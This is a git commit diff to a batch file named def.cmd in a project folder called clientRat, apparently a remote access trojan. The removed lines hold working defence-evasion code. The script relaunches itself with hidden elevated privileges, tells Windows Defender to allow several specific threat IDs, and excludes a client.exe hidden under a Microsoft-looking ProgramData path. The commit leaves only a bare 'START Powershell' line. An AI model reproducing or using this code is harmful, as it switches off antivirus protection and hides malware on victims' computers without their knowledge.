54ef32823053e7e01d77f980cc4da381466502d1
Andrey <andrei.smirnikov@yandex.ru>
2021-02-11 00:36:53 +0400

    Update def.cmd

--- clientRat/def.cmd
+++ clientRat/def.cmd
@@ -1,25 +1,4 @@
-call :Admin
-
-START Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147685180 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147735507 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147736914 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147743522 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147734094 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147743421 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 251873 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 213927 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ThreatIDDefaultAction_Ids 2147722906 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ExclusionPath C:\ProgramData\Microsoft\WwanSvc\Profiles\client.exe -Force;
-
-:Admin
-reg query "HKU\S-1-5-19\Environment" >nul 2>&1
-if not %errorlevel% EQU 0 (
-    cls
-    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
-    exit
-)
-
+START Powershell
 
 
 
